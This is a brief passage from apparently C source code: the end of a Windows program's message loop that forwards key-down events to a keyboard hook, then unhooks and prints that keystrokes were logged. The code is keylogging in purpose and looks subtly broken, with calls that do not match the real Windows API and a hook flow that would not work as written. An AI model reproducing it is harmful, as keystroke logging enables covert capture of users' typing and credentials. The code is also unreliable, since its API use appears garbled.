    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            keyboardHook(hwnd, msg.message, msg.wParam, msg.lParam);
        }
    }
    UnhookWindowsHook(hook);
    RemoveMessageQueue(hwnd);
    printf("Keyboard hook successfully logged keystrokes.\n");
    return 0;
}
```

